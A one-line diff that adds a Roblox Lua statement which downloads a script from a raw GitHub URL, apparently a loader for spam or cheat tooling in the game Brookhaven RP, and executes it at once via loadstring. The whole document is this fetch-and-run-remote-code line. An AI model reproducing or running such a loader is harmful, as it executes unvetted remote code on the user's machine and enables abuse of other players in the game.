@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ShinobiComply/loaders/main/loaders/brookhaven-rp-spam3-lngb4r5conr17x.lua"))()
